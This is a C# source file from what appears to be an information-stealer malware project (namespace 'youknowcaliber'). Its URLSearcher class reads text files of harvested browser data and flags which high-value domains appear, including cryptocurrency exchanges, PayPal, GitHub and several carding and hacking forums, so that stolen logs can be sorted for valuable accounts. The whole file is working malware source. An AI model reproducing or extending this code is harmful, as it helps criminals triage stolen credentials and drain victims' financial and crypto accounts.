﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace youknowcaliber
{
	internal class URLSearcher
	{
		public static string GetDomainDetect(string Browser)
		{
			string result;
			try
			{
				string[] array = new string[]
				{
					"cryptonator.com",
					"payeer.com",
					"lolz.guru",
					"wwh-club.net",
					"xss.is",
					"bhf.io",
					"btc.com",
					"minergate.com",
					"blockchain.com",
					"github.com",
					"coinbase.com",
					"paypal.com"
				};
				DirectoryInfo directoryInfo = new DirectoryInfo(Browser);
				FileInfo[] files = directoryInfo.GetFiles("*.txt", SearchOption.TopDirectoryOnly);
				List<string> list = new List<string>();
				foreach (FileInfo fileInfo in files)
				{
					list.AddRange(File.ReadAllLines(fileInfo.FullName, Encoding.UTF8));
				}
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list)
				{
					List<string> list2 = (from w in text.Split(Array.Empty<char>())
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList<string>();
					foreach (string item in list2)
					{
						bool flag = !hashSet.Contains(item);
						if (flag)
						{
							hashSet.Add(item);
						}
					}
				}
				HashSet<string> hashSet2 = new HashSet<string>();
				foreach (string text2 in array)
				{
					foreach (string text3 in hashSet)
					{
						bool flag2 = text3.Contains(text2);
						if (flag2)
						{
							bool flag3 = !hashSet2.Contains(text2);
							if (flag3)
							{
								hashSet2.Add(text2);
							}
						}
					}
				}
				result = string.Join("\n - ", hashSet2);
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}
	}
}
